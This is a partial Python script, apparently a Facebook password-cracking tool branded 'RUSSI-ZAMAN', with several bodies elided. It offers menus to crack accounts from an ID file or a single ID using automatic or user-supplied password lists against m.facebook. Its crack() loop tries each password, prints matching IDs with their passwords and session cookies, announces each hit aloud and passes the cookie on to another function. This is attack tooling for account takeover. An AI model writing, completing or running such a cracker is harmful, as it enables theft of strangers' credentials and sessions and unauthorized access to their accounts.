...
def menu():
	...
	print(f'\x1b[1;92m1- CRACK FILE')
	print(f'\x1b[1;93m2- CRACK ID')
	print(f'\x1b[1;91m3- CRAETE FILE')
...
#SERVER-SETTING			
def Settings():
	print(f'\33[1;37m[ 1 ] Random = NEW +OLD')
	hu = input('\33[1;37mSelect ∘ ')
	if hu in ['0','00']:
		muda=[]
	...
	print('\33[1;37m------------------------------------------')
	print(f'\33[1;37m[ 1 ] Method m.facebook ')
	hc = input('\33[1;37mSelect ∘ ')
	print('\33[1;37m------------------------------------------')
	if hc in ['1','01']:
		...
		print('\33[1;37m------------------------------------------')
	pwplus=input('\33[1;37m[ 1 ] Auto Pass\n[ 2 ] Add Your Pass\n Select ∘ ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[1;37m [ RUSSI-ZAMAN ]{P} [{H}{loop}{P}][{H}{len(id)}{P}] [{H}OK{m}${H}{ok}{P}]  "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\x1b[32[RUSSI-OK]\033[1;96m   {idf} | \033[1;96m{pw} | \033[1;30m{kuki}')
                os.system('espeak -a 300 " RUSSI CRACK   OK"')
                cek_SURCHY(kuki)
                break
